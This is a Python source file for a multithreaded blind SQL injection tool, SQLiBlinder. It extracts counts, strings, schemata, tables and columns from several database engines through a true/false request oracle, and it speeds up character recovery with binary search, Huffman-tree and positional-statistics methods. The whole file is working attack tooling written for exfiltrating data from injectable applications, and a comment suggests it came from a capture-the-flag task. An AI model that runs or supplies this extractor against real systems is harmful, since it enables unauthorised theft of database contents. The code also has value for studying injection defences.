from concurrent.futures import ThreadPoolExecutor
from .engines import *
from .statistics import *
from .huffman_tree import huffman_tree, score, get_chars_in_tree
import logging
from enum import Enum

class ErrorProcessStrategy(Enum):
    FULL_SEARCH = 1


class SQLiBlinder:
	"""Blind SQL injector"""

	def __init__(self, request_func, dbms, multithreaded=True, threads=16, 
				auto_string_convert=True, get_long_strings=False, 
				error_processing_strategy=ErrorProcessStrategy.FULL_SEARCH,
				char_in_position_opt=True, alphabet_autocreate_opt=True,huffman_tree_opt=True):
		"""`request_func` - function, that take 1 param. If param is "1=1" request_func must return True,if param is "1=0" request_func must return False
		 `dbms` - one of ["mysql","mssql","oracle","sqlite"]
		 `multithreaded` - if True run number of threads, else one
		 `threads` - number of threads (only for multithreaded)
		 `auto_string_convert` - convert all columns to string (via CAST(col as TEXT) etc.
		 `get_long_strings` - do find symbols after 64
		 `char_in_position_opt` - do statistics analyze of chars in same position. For example, GUID always have same symbol dash in known position. If statistics shows that symbol always in same position, then check this char first.
		 `alphabet_autocreate_opt` - auto build charset for search based on already found characters
		 `huffman_tree_opt` - make huffman-tree search; huffman tree is built based on selective distribution
		 """
		self.request_func = request_func
		self.dbms = dbms.lower()
		self.init_params(self.dbms)
		self.multithreaded = multithreaded
		self.threads = threads
		self.auto_string_convert = auto_string_convert
		self.get_long_strings = get_long_strings
		self.long_string_limit = 64
		self.ascii_search_limit = 128 #128 - low part of ascii table for search, 256 - full ascii table		
		self.error_processing_strategy = error_processing_strategy
		self.total_chars = 0
		self.total_requests = 0
		self.not_char_requests = 0
		self.statistics = Statistics()
		self.char_in_position_opt = char_in_position_opt
		self.char_in_position_opt_count = 3
		self.alphabet_autocreate_opt = alphabet_autocreate_opt
		self.alphabet_autocreate_limit = 64
		self.huffman_tree_opt = huffman_tree_opt
		self.huffman_tree_limit = 64

	def get_column_expression(self,column):
		if self.auto_string_convert:
			return self.dbms.convert_to_text.format(column)
		else:
			return column

	def init_params(self, dbms):
		dbms_obj = engines.get(dbms, None)
		if not dbms_obj:
			raise Exception(f"{dbms} not supported")
		
		self.dbms = dbms_obj

	def check(self):
		if self.request_func("1=1") == True:
			if self.request_func("1=0") == False:
				return True
		return False

	def define_string(self, table_name, column_name, index, where=None, order_by=None):
		if order_by is None:
			order_by = column_name
		return f"{self.dbms.string_definition.format(self.get_column_expression(column_name))} {self.get_from_clause(table_name, index, order_by, where)}" 

	def get_from_clause(self, table_name, index, order_by, where=None):
		if table_name is None:
			return ""
		to_where = ""
		if where != None:
			to_where = f"WHERE {where}" 
		return self.dbms.base_from_clause.format(order_by=order_by, table_name=table_name, where=to_where, row_num=index)

	def define_string_len(self, table_name, column_name, index, where=None, order_by=None):
		if order_by is None:
			order_by = column_name
		return f"{self.dbms.string_len_definition.format(self.get_column_expression(column_name))} {self.get_from_clause(table_name, index, order_by, where)}"

	def define_string_char(self, table_name, column_name, index, string_pos, where=None, order_by=None):
		if order_by is None:
			order_by = column_name
		return f"{self.dbms.string_char_definition.format(self.get_column_expression(column_name), string_pos)} {self.get_from_clause(table_name, index, order_by, where)}"

	def define_count(self, table_name, where=None):
		to_where = ""
		if where != None:
			to_where = f"WHERE {where}"
		return self.dbms.count_definition.format(table_name, to_where)

	def build_sql_binary_query(self, query, value, search_for_number):
		if isinstance(self.dbms, SQLite) and search_for_number == False:
			# this is cause " was banned in task, but works always
			return f"({query})>=hex(char({value}))"
		else:
			return f"({query})>={value}"

	def build_sql_binary_set_query(self,query,subset):
		converted_subset = ','.join([self.dbms.binary_set_format.format(ord(a)) for a in subset])
		return f"({query}) not in ({converted_subset})"

	def build_sql_huffman_tree_query(self,query,subset):
		converted_subset = ','.join([self.dbms.binary_set_format.format(ord(a)) for a in subset])
		return f"({query}) in ({converted_subset})"

	def get_bool(self, sql):
		self.total_requests+=1
		return self.request_func(sql)

	# start_val should be power of 2
	def binary_search(self, s, start_val, start_val_defined=False, search_for_number=False, not_char_request=False):
		# define real_start_val:
		if not start_val_defined:
			while True:
				sql = self.build_sql_binary_query(
					s, start_val - 1, search_for_number)
				# print sql
				if(not_char_request):
					self.not_char_requests+=1
				r = self.get_bool(sql)
				if r:
					start_val *= 8
				else:
					break
		# now start_val > len
		cur_val = start_val / 2
		move = start_val / 4
		while True:
			sql = self.build_sql_binary_query(s, cur_val, search_for_number)
			# print sql
			if(not_char_request):
				self.not_char_requests+=1
			r = self.get_bool(sql)
			# print r
			if move < 1:
				if r:
					return int(cur_val)
				else:
					return int(cur_val - 1)
			if r:  # (cur_val+1 - cur_val+2*move)
				cur_val += move
			else:
				cur_val -= move
			move = move/2

	def binary_search_set(self, s, alph_set):
		if len(alph_set)==0:
			return False
		alph_set = [c for c in alph_set]
		alph_set += ['CANNARY']
		while True:
			l = len(alph_set)
			first_part = alph_set[:l//2]
			sql = self.build_sql_binary_set_query(s,first_part)
			#print(sql)
			r = self.get_bool(sql)
			#print('Result: {}'.format(r))
			if not r:
				new_alph_set = first_part
			else:

				new_alph_set = alph_set[l//2:]
			if len(new_alph_set) == 1:
				if new_alph_set[0]=='CANNARY':
					return False
				else:
					return new_alph_set[0]
			#print(f'old subset: {alph_set}')
			alph_set = new_alph_set

			#print(f'new subset: {new_alph_set}')

	def huffman_tree_search(self,s,char_statistics):
		char_statistics['CANNARY'] = 1
		tree = huffman_tree(char_statistics)
		while True:
			if type(tree[1])==float:
				if tree[0] == 'CANNARY':
					return False
				else:
					return tree[0]
			left = tree[0]
			right = tree[1]
			left_chars = get_chars_in_tree(left)
			right_chars = get_chars_in_tree(right)
			#print (f'left: {left_chars}, right: {right_chars}')
			if 'CANNARY' in left_chars:
				check = right
				not_check = left
			else:
				check = left
				not_check = right
			check_chars = get_chars_in_tree(check)
			sql = self.build_sql_huffman_tree_query(s,check_chars)
			r = self.get_bool(sql)
			#print (f'SQL: {sql}, result: {r}')
			if r:
				new_tree = check
			else:
				new_tree = not_check
			tree = new_tree
			#print (f'choose: {get_chars_in_tree(tree)}')

	def get_count(self, table_name, where=None):
		s = self.define_count(table_name, where)
		return self.binary_search(s, 32, False, True, not_char_request=True)

	def get_integer(self, table_name, column_name, index, where=None, order_by=None):
		s = self.define_string(table_name, column_name,
							   index, where=where, order_by=order_by)
		return self.binary_search(s, 32, False, True)

	def get_length_of_string(self, table_name, column_name, index, where=None, order_by=None):
		s = self.define_string_len(
			table_name, column_name, index, where, order_by)
		if self.get_long_strings: 
			result =  self.binary_search(s, 32, start_val_defined=False, search_for_number=True, not_char_request=True)
		else:
			result = self.binary_search(s,self.long_string_limit,start_val_defined=True,search_for_number=True, not_char_request=True)
		#print (self.get_long_strings, result)
		return result

	def get_char(self, table_name, column_name, index, str_pos, where=None, order_by=None, alphabet=None):
		res_found = False
		s = self.define_string_char(
			table_name, column_name, index, str_pos, where, order_by)
		if self.char_in_position_opt:
			stats = self.statistics.get_char_in_position(table_name,column_name,str_pos-1)
			if len(stats)>=self.char_in_position_opt_count:
				#print (f'pos: {str_pos}')
				#print (f'Stats for symbol {stats}')
				if all([stats[0] == s for s in stats]) and stats[0] is not None:
					#all symbols in str_pos are the same. Maybe this symbol too? check
					#print(f'Check optimized symbol: {stats[0]}')
					res = self.binary_search_set(s,[stats[0]])
					#print(f'Found after binary search {res}')
					#fefefe()
					if res!=False:
						#print(f'Found optimized symbol: {res}')
						res_found=True
		# huffman tree section
		if (res_found == False) and (alphabet is None) and (self.huffman_tree_opt == True): 
			# check if we have enough data for huffman tree
			chars = self.statistics.get_chars(table_name, column_name)
			already_found_chars = sum([chars[k] for k in chars] )
			if already_found_chars >= self.huffman_tree_limit:
						#enough
				res = self.huffman_tree_search(s,chars)
				if res != False:
					res_found = True
		# alphabet autocreate section (useless if huffman tree already launched)
		if (res_found == False) and (alphabet is None) and (self.alphabet_autocreate_opt == True) and (self.huffman_tree_opt==False): 
			# if we have enough statistics lets create alphabet
			chars = self.statistics.get_chars(table_name, column_name)
			already_found_chars = sum([chars[k] for k in chars] )
			if already_found_chars >= self.alphabet_autocreate_limit:
						#enough
				res = self.binary_search_set(s,chars.keys())
				if res != False:
					res_found = True


		if res_found==False:
			if alphabet is None:
				res = chr(self.binary_search(s, self.ascii_search_limit, True))
			else:
				res = self.binary_search_set(s,alphabet)
				if res == False:
					# Char not in alph. Process Error
					if self.error_processing_strategy == ErrorProcessStrategy.FULL_SEARCH:
						res = chr(self.binary_search(s, self.ascii_search_limit, True))
		self.total_chars+=1
		return res

	def get_char_for_pool(self, chunk):
		return self.get_char(*chunk)

	def get_string(self, table_name, column_name, index, where=None, order_by=None, alphabet=None):
		if type(alphabet) == str:
			alphabet = [c for c in alphabet]
		l = self.get_length_of_string(
			table_name, column_name, index, where, order_by)
		logging.debug(f"length({column_name},{index}): {l}")
		r = ""
		suffix = '[...]' if (l == self.long_string_limit-1) else ''
		if not self.multithreaded:
			for i in range(l):
				r += self.get_char(table_name, column_name,
								   index, i + 1, where, order_by, alphabet)
				
			return r + suffix
		else:
			with ThreadPoolExecutor(max_workers=self.threads) as pool:
				r = "".join(list(pool.map(self.get_char_for_pool, [
							(table_name, column_name, index, i + 1, where, order_by, alphabet) for i in range(l)])))
				return r + suffix

	def get(self, columns, table_name, where=None, order_by=None,alphabet=None):
		count = self.get_count(table_name, where)
		logging.info(f"count of rows to extract: {count}")
		res = []
		if order_by is None:
			order_by = columns[0]
			r = [x for x in columns if x.lower() == "id"]
			if any(r):
				order_by = r[0]
		for i in range(count):
			cs = []
			for column in columns:
				value = self.get_string(table_name, column, i + self.dbms.offset_shift, where, order_by,alphabet=alphabet)
				self.statistics.log(table_name,column,value)
				cs.append(value)
			logging.warning(cs)
			res.append(cs)
		return res

	def get_columns_with_types(self, table_name):
		if isinstance(self.dbms, Postgre):
			oid = self.get_string("pg_class", "cast(oid as TEXT)", 0, where=f"relname='{table_name}'", order_by="oid")
			oid = int(oid)
			cols = self.get(["attname", "cast(atttypid as TEXT)"],
							"pg_attribute", where=f"attrelid={oid} and attnum>0")
			types = list(set([c[1] for c in cols]))
			types_table = {}
			for typid in types:
				type_name = self.get_string(
					"pg_type", "typname", 0, where="oid={}".format(int(typid)), order_by="oid")
				types_table[typid] = type_name
			return [[col[0], types_table[col[1]]] for col in cols]
		else:
			return f"{self.dbms} not supported"

	def get_schemata(self, alphabet=None):
		if hasattr(self.dbms, "schemata_query"):
			if hasattr(self.dbms, "schemata_disclaimer"):
				logging.info(self.dbms.schemata_disclaimer)
			column, table, where = self.dbms.schemata_query
			return self.get([column], table, where=where,alphabet=alphabet)
		else:
			logging.info(f"{self.dbms} schemata request is not supported")

	def get_tables(self, schema, alphabet=None):
		if schema is None:
			if hasattr(self.dbms, "tables_query"):
				column, table, where = self.dbms.tables_query

				return self.get([column], table, where=where)
			else:
				logging.info(f"{self.dbms} tables request is not supported")
		else:
			if hasattr(self.dbms, "tables_schema_query"):
				column, table, where = self.dbms.tables_schema_query
				where = where.format(schema_name=schema)
				return self.get([column], table, where=where,alphabet=alphabet)
			else:
				logging.info(f"{self.dbms} tables request is not supported")

	def get_columns(self, table_name, alphabet=None):
		if hasattr(self.dbms, "columns_query"):
			column, table, where = self.dbms.columns_query
			columns = self.get(
				[column], table, where=where.format(table_name=table_name),alphabet=alphabet)
			return [x[0] for x in columns]
		else:
			logging.info(f"{self.dbms} columns request is not supported")

	def get_stats(self):
		return [self.total_chars,self.total_requests,float(self.total_requests)/self.total_chars]

	def print_stats(self):
		print(f'Chars found: {self.total_chars}')

		print(f'Total requests issued: {self.total_requests}')
		char_requests = self.total_requests - self.not_char_requests
		print(f'Only char requests issued: {char_requests}')
		r_p_c = float(self.total_requests)/self.total_chars
		print(f'Total requests per char: {r_p_c}')
		c_r_p_c = float(char_requests)/self.total_chars
		print(f'Char requests per char: {c_r_p_c}')

	def get_statistics(self):
		return self.statistics


